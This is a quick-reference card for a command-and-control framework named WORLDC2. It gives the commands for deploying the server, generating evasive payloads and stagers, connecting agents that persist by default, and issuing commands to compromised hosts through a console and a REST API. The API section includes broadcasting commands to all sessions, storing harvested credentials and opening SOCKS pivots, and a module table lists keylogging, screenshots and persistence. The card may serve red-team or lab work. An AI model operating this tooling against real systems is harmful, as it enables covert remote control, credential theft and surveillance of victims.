# WORLDC2 C2 - Quick Reference Card

## Deploy
```bash
python3 scripts/deploy.py              # Auto-detect IP, start server
python3 scripts/deploy.py --port 443   # Custom port
```

## Generate Payloads
```bash
python3 scripts/payload.py             # Interactive menu
python3 scripts/payload.py --os all    # All platforms
python3 scripts/payload.py --os windows --evasive  # + stagers
```

## Connect Agent
```bash
./worldc2-agent <server-ip>:8443           # Go agent
WORLDC2_SERVER=<ip>:8443 ./worldc2-agent       # Via env var
./worldc2-agent <server-ip>:8443 -no-persist   # Lab runs: no auto-persistence
```

## CLI Console
```bash
python3 scripts/console.py
worldc2 > sessions
worldc2 > interact <id>
[id] user@host > whoami
[id] user@host > background
worldc2 > broadcast id
```

## API Examples
```bash
# Health
curl http://localhost:9090/api/health

# List sessions
# 1. Authenticate (one time)
TOKEN=$(curl -s -X POST http://localhost:9090/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"<your-password>"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# 2. Use the token on every call
curl -s http://localhost:9090/api/sessions -H "Authorization: Bearer $TOKEN"

# Execute command
curl -s -X POST http://localhost:9090/api/cmd \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"agent_id":"abc123","command":"whoami","timeout":10}'

# Broadcast
curl -s -X POST http://localhost:9090/api/broadcast \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"command":"id"}'

# Store credential
curl -s -X POST http://localhost:9090/api/vault \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"username":"admin","password":"pass123","domain":"CORP"}'

# Start SOCKS proxy
curl -s -X POST http://localhost:9090/api/socks \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"session_id":"abc123","port":1080}'
```

## Security
```bash
python3 scripts/harden.py              # Audit
python3 scripts/harden.py --apply      # Fix issues
python3 scripts/gen_certs.py           # TLS certs
```

## Docker
```bash
docker compose up -d                   # Start all
docker compose logs -f c2-server       # View logs
docker compose down                    # Stop
```

## Make
```bash
make build          # Compile
make test           # Go tests
make test-all       # All tests
make docker         # Docker up
make harden         # Security report (report-only; apply fixes manually)
make certs          # TLS certs
make clean          # Clean artifacts
make help           # Show all targets
```

## Ports
| Port | Protocol | Use |
|------|----------|-----|
| 8443 | TCP/TLS | Agent C2 |
| 8445 | HTTP | Long-poll transport (agent fallback chain; TLS when `tls.enabled`) |
| 8446 | WebSocket | Real-time |
| 8447 | HTTP(S) | WebRTC signaling + data channels |
| 9090 | HTTP | API + Dashboard |

All transport ports are defaults; a deployment that moves them overrides the server
keys (`transport.http_port` / `ws_port` / `webrtc_port` / `dns_port`) and the agent flags
`-http-port` / `-ws-port` / `-webrtc-port` / `-dns-port` to match (round 3).

## Modules
| Command | Description |
|---------|-------------|
| `sysinfo` | System information |
| `ps` | Process list |
| `netinfo` | Network info |
| `persistence` | Establish persistence |
| `screenshot` | Screen capture |
| `keylogger` | Key capture |
| `find:*.txt` | File search |
| `modules` | List available modules |
